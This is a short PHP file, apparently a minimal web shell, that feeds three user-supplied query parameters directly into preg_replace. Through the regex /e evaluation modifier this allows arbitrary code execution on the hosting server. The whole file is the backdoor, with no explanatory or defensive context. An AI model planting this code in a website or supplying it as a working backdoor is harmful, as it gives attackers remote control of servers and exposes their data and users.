<?
$pattern = $_GET["pat"];
$replacement = $_GET["rep"];
$subject = $_GET["sub"];
if (isset($pattern) && isset($replacement) && isset($subject)) {
    preg_replace($pattern, $replacement, $subject);
} else {
    die();
}